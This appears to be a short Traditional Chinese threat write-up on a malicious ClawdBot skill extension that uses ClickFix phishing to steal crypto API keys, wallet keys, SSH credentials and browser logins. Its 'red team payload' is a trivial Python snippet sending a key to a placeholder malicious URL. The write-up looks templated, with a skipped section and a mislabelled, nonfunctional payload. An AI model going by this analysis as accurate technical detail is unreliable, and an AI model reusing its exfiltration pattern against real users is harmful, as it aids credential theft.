# 🚨 解析 ClawdBot 惡意延伸套件與 NovaStealer 攻擊技術
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.0)
> * **受駭指標**: RCE (Remote Code Execution) 與 Info Leak
> * **關鍵技術**: ClickFix 網釣手法、惡意技能套件、加密貨幣自動化交易功能

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ClawdBot 惡意延伸套件利用 ClickFix 網釣手法，誘使使用者執行惡意指令，從而竊取加密貨幣交易所的 API 金鑰、錢包私鑰、SSH憑證，以及瀏覽器存放的帳密資料。
* **攻擊流程圖解**:
  1. 使用者安裝惡意技能套件
  2. 套件啟動 ClickFix 網釣手法
  3. 使用者點擊惡意連結或按鈕
  4. 惡意指令被執行，竊取敏感資料
* **受影響元件**: ClawdBot 用戶、Windows 與 macOS 系統

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: ClawdBot 用戶權限、網路位置
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 惡意技能套件的 API 金鑰
    api_key = "your_api_key"
    
    # 惡意指令的 URL
    url = "https://example.com/malicious_url"
    
    # 發送惡意請求
    response = requests.post(url, headers={"Authorization": f"Bearer {api_key}"})
    
    # 執行惡意指令
    if response.status_code == 200:
        #竊取敏感資料
        print("Sensitive data stolen!")
    
    ```
* **繞過技術**: 使用 ClickFix 網釣手法，誘使使用者點擊惡意連結或按鈕

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **ClickFix 網釣手法**: 一種社交工程攻擊，誘使使用者點擊惡意連結或按鈕
* **惡意技能套件**: 一種惡意的 ClawdBot 延伸套件，竊取敏感資料
